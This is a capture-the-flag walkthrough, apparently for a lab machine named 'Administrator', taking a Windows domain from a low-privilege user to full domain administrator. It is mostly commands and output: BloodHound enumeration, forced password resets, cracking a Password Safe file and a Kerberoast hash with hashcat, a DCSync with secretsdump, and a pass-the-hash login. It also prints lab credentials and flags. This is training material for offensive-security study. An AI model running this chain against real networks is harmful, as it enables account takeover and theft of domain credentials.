# Administrator

## Recon

We nmap the target IP

nmap -p- --min-rate 10000 10.129.9.239

PORT      STATE SERVICE  
21/tcp    open  ftp  
53/tcp    open  domain  
88/tcp    open  kerberos-sec  
135/tcp   open  msrpc  
139/tcp   open  netbios-ssn  
389/tcp   open  ldap  
445/tcp   open  microsoft-ds  
464/tcp   open  kpasswd5  
593/tcp   open  http-rpc-epmap  
636/tcp   open  ldapssl   
3268/tcp  open  globalcatLDAP  
3269/tcp  open  globalcatLDAPssl  
5985/tcp  open  wsman  
9389/tcp  open  adws  
47001/tcp open  winrm  
49664/tcp open  unknown  
49665/tcp open  unknown  
49666/tcp open  unknown  
49667/tcp open  unknown  
49668/tcp open  unknown  
53065/tcp open  unknown  
53070/tcp open  unknown  
53073/tcp open  unknown  
53090/tcp open  unknown  
65061/tcp open  unknown

PORT     STATE SERVICE       VERSION  
21/tcp   open  ftp           Microsoft ftpd  
| ftp-syst:   
|_  SYST: Windows_NT   
53/tcp   open  domain        Simple DNS Plus  
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-18 06:45:14Z)  
135/tcp  open  msrpc         Microsoft Windows RPC  
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn  
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)  
445/tcp  open  microsoft-ds?  
464/tcp  open  kpasswd5?  
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
636/tcp  open  tcpwrapped  
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)  
3269/tcp open  tcpwrapped  
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-server-header: Microsoft-HTTPAPI/2.0  
|_http-title: Not Found  
9389/tcp open  mc-nmf        .NET Message Framing  
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows  

Host script results:  
| smb2-time:   
|   date: 2026-03-18 T06:45:17  
|_  start_date: N/A  
| smb2-security-mode:   
|   3.1.1:   
|_    Message signing enabled and required  
|_clock-skew: 7h00m06s  

The box looks like a Windows domain controller (Kerberos, LDAP, SMB, etc). It also has WinRM (5985) open if I find creds for a user with those permissions.

The domain name administrator.htb shows on the LDAP script output. There’s also a hostname, DC. I add these to my /etc/hosts file using netexec

I am given credentials for a low priv user (Olivia, password “ichliebedich”) at the start of the box.  I’ll verify they do work over SMB:
Username: Olivia Password: ichliebedich

netexec smb 10.129.9.239 -u olivia -p ichliebedich  
SMB         10.129.9.239    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True)   (SMBv1:None) (Null Auth:True)  
SMB         10.129.9.239    445    DC               [+] administrator.htb\olivia:ichliebedich   

Now I check for winrm  
netexec winrm 10.129.9.239 -u olivia -p ichliebedich  
WINRM       10.129.9.239    5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)  
WINRM       10.129.9.239    5985   DC               [+] administrator.htb\olivia:ichliebedich (Pwn3d!)  


Let's try some FTP

netexec ftp 10.129.9.239 -u olivia -p ichliebedich

FTP         10.129.9.239    21     10.129.9.239     [-] olivia:ichliebedich (Response:530 User cannot log in, home directory inaccessible.)  

Given this access, I want to prioritize things like:
WinRM / filesystem enumeration  
SMB shares   
Bloodhound
ADCS  

### Shell as Olivia

*Evil-WinRM* PS C:\Users\olivia\Documents> tree /f . => nothing interest

*Evil-WinRM* PS C:\> ls => there is some Window stuff

User Olivia doesn't have acess to ftproot  
*Evil-WinRM* PS C:\inetpub> ls ftproot  
Access to the path 'C:\inetpub\ftproot' is denied.  

*Evil-WinRM* PS C:\inetpub> whoami /all => Olivia hasthe "Remote Management Users"

ftp - tcp 21
ftp 10.129.9.239                
Connected to 10.129.9.239.  
220 Microsoft FTP Service  
Name (10.129.9.239:kali): anonymous  
331 Password required  
Password:   
530 User cannot log in.  
ftp: Login failed  
ftp>   

netexec smb administrator.htb -u guest -p '' --shares  
SMB         10.129.9.239    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True)   (SMBv1:None) (Null Auth:True)
SMB         10.129.9.239    445    DC               [-] administrator.htb\guest: STATUS_ACCOUNT_DISABLED  

=> Nothing interesting

Now i used credentials i find above

 netexec smb administrator.htb -u olivia -p ichliebedich --shares  
SMB         10.129.9.239    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True)   (SMBv1:None) (Null Auth:True)  
SMB         10.129.9.239    445    DC               [+] administrator.htb\olivia:ichliebedich   
SMB         10.129.9.239    445    DC               [*] Enumerated shares  
SMB         10.129.9.239    445    DC               Share           Permissions     Remark  
SMB         10.129.9.239    445    DC               -----           -----------     ------  
SMB         10.129.9.239    445    DC               ADMIN$                          Remote Admin  
SMB         10.129.9.239    445    DC               C$                              Default share  
SMB         10.129.9.239    445    DC               IPC$            READ            Remote IPC  
SMB         10.129.9.239    445    DC               NETLOGON        READ            Logon server share   
SMB         10.129.9.239    445    DC               SYSVOL          READ            Logon server share   

bloodhound-python -d administrator.htb -c all -u olivia -p ichliebedich -ns 10.129.9.239 --zip

Then I go to bloodhound and mark Olivia as owned

Michael is in the Remote Management Users group as well:

### Shell as michael

The most straight forward way to abuse GenericAll is to change the michael user’s password.
BloodHound shows an edge from Olivia to Michael and then to Benjamin.

net rpc password "michael" "NEWPASSWORD" -U "administrator.htb"/"olivia"%"ichliebedich" -S 10.129.9.239

netexec smb 10.129.9.239 -u michael -p 'NEWPASSWORD'         
SMB         10.129.9.239    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True)   (SMBv1:None)  
SMB         10.129.9.239    445    DC               [+] administrator.htb\michael:NEWPASSWORD.   

And it also works for WinRm
netexec winrm  10.129.9.239 -u michael -p 'NEWPASSWORD'
WINRM       10.129.9.239    5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)    
WINRM       10.129.9.239    5985   DC               [+] administrator.htb\michael:NEWPASSWORD. (Pwn3d!)    

Then I login with winrm  
*Evil-WinRM* PS C:\Users\michael\Documents> whoami  
administrator\michael  


In the Bloodhound data, michael has ForceChangePassword over benjamin: 
I do same thing above to change the password 

net rpc password "benjamin" "NewPassword" -U "administrator.htb"/"michael"%"Passwordabove" -S 10.129.9.239

and it works  
netexec smb 10.129.9.239 -u benjamin -p ''  
SMB         10.129.9.239    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True)   
SMB         10.129.9.239    445    DC               [+] administrator.htb\benjamin:  

Let is try with winrm
WINRM       10.129.9.239    5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
WINRM       10.129.9.239    5985   DC               [-] administrator.htb\benjamin:
=> Not working

And it works for ftp  
netexec ftp  10.129.9.239 -u benjamin -p ''   
FTP         10.129.9.239    21     10.129.9.239     [+] benjamin:   

That’s because Benjamin is in the Share Moderates group, as I can see from my shell as Olivia:  
*Evil-WinRM* PS C:\inetpub> net user benjamin  
 

### Shell as emily

ftp 10.129.9.239                  
Connected to 10.129.9.239.  
220 Microsoft FTP Service  
Name (10.129.9.239:kali): benjamin  
331 Password required  
Password:   
230 User logged in.  
Remote system type is Windows_NT.  
ftp> ls  
229 Entering Extended Passive Mode (|||61613|)  
125 Data connection already open; Transfer starting.    
10-05-24  09:13AM                  952 Backup.psafe3  
226 Transfer complete.  

ftp> get Backup.psafe3

file Backup.psafe3                
Backup.psafe3: Password Safe V3 database  

the first line of the file is what has the encrypted password, so it can be passed directly the hashcat

hashcat -m 5200 Backup.psafe3 /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt 

The password: Backup.psafe3:tekieromucho   
i use password safe from github 

After login with password safe it had 3 entries It has three entries:

I used those user/password to test them netexec netexec smb administrator.htb -u alexander -p 'UrkIbagoxMyUGw0aPlj9B0AXSea4Sw'  
SMB         10.129.9.239    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True)   (SMBv1:None) (Null Auth:True) 
SMB         10.129.9.239    445    DC               [-] administrator.htb\alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw STATUS_LOGON_FAILURE  
                                                                                                          
┌──(kali㉿kali)-[~/htb/Administrator]  
└─$ netexec smb administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'  
SMB         10.129.9.239    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True)   (SMBv1:None) (Null Auth:True)  
SMB         10.129.9.239    445    DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb  
                                                                                                          
┌──(kali㉿kali)-[~/htb/Administrator]  
└─$ netexec smb administrator.htb -u emma -p 'WwANQWnmJnGV07WQN8bMS7FMAbjNur'  
SMB         10.129.9.239    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True)   (SMBv1:None) (Null Auth:True)  
SMB         10.129.9.239    445    DC               [-] administrator.htb\emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur STATUS_LOGON_FAILURE  


Let's try winrm

netexec winrm administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'  

=> it is working

I connect over Evil-WinRM:

evil-winrm -i administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'  

*Evil-WinRM* PS C:\Users\emily\Documents> whoami  
administrator\emily  

### User flag

*Evil-WinRM* PS C:\Users\emily\desktop> cat user.txt  
f5ab3afe7475ea9fde98fbd21e0c7f44  

Auth as ethan

Bloodhound shows that emily has GenericWrite over ethan:

Then i do 
faketime -f +7h python targetedKerberoast.py -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --request-user ethan   
[*] Starting kerberoast attacks  
[*] Attacking user (ethan)  
[+] Printing hash for (ethan)   

$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$dfbba7a4f80859712bde5c1209a13a15$76ae84b02e89bbb851328a8fbe491e0f362edbfc8df40eab398d11a3296629b6ef1902b9a7f9eca7d088138f6f972590c2fee33e0cd18118d666fde869285010cc4205393982673729828bf87ec1b49d6dfd63b643410f4791026d4620135931b22427b0e91bed88b36640d5e2f7128a8658aa4a26eba104a7415c5521e8688d2beea2c5cbacfe14770738114f600210a339025bdda545fb666106a66196931e7fc09ccf0c92bdf9f95576e80a008f6494f94d0511ab661bdd386828148e6889966ecafc5b49f4b4aea8ed08e178f11cb0686826e47a163f6b099e98febf0cefd764b822ba40cb5ee7b1614be6f8d1b455533ae062a97b764249936ec86ba320651d0267c31abd9519423d47448a584b0e97b1bc697131511068aac02e3be49b33057c51d960b7deefe8b41e211bbaa7e00d31f3f91dd251928e954101d4a11a22b61a7657a25ae7ea05c6b9a6d887a554f6ce95a7f88cec92c68d623c72cb33aac4110d047fdb400a31cc332953ea14a31d44f477aaf45e127c3c0a6b8d4c92e15e2f010422ca5facdb43adb8dc939c4ab272e3a016a7315d4d2b776196b781d1e6eaabfbf9cfca4eb33ac499f808d64a8f718f9d5a44bd127d6d96283c2328297636f7e791eacb203ac0f268e95e372fe2380dacd6cf8837cf1dcc77b95449d75dffaee487b0d0aa45ab843091efe6af1db598e04db6d792224799a55ce9e54183b42f8f055730a1a7c26820809a28e2d620870a453f64f39541bb90f0d9352a21f0808d5457688b354f3369bbfa6766b8e645875acd2795a532ec54afb5a107b743dd91cf29eb2f463e88dce0f6e62e48f1c078b0008e300f0063b9472e4c8f8801131e20b6620dab5d14ad7d74b69d3af598ee89f4262cb508006acabac2f7365ea560ad7eb37d5f0d3737a5e4cc95bece649e8f7e40ffd7a070a4ab64eb0e7d4c9e58c1dcfe95876417ccf1946bed7975f81395a6a38e875eba268bf0652b2ba950588349dc4e4df39e29253a37936ff1dcdeb596d0375341e5eac8369dc459ce0b322b5be79674202b5a86fbc9299d233cfeeb75faa46d2dfc3bca9fb07b1c469e03c14a3e79b202bce9a1e20dfd8ac9e0d3b3fc4bfc85e7030595df6cb155bdfcac2d4ada2bdab1f55d0ff02c66db263e7ad50fda7b5bee80747fba882d8b3632b47c4a26032a76507950bf84a483f48a12a329cf51644ceb8430320698e4ae418a0aef480a6f274104c70b362215e34aa3357649afb5a1706ddb586f88d94fba0c64a250e5226af8c38457fd03dae0cc6605daa3b46c0012b6efbad3187a3fdb9e36ddd03f7983c8760c2db498ba1895bc3e7434fe67e46290a4fced0f372b12dde658f7115f941c61a40eabbaa6f085d50bd1d868ffed9c30e8ba477ac6543a39d1239cfc803d2ddbd5399980533e7b2f589770ddb8ee55d205e1cbe336177c90c308b0d2020ed6083ceb99bcd9595d401afdbcb91ec6a727898cebd49cb364cef34c7f6f2b7be771f1259b1feba9f7478ae1a71c91a978dc153e


hashcat ethan.hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt  

Ethan's password is limpbizkit

Check to see it is a valid cred

netexec smb administrator.htb -u ethan -p limpbizkit 
SMB         10.129.9.239    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True)   (SMBv1:None) (Null Auth:True)  
SMB         10.129.9.239    445    DC               [+] administrator.htb\ethan:limpbizkit  

but not work with winrm 
netexec winrm administrator.htb -u ethan -p limpbizkit

### Shell as administrator

ethan has DCSync privileges over the domain when looking at bloodhound:

impacket-secretsdump 'Administrator/ethan:limpbizkit@dc.administrator.htb'

[*] Using the DRSUAPI method to get NTDS.DIT secrets  
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::  

evil-winrm -i dc.administrator.htb -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e  

*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         3/17/2026  11:36 PM             34 root.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt  
1184dc05b5a620d21bd515490d16947b  
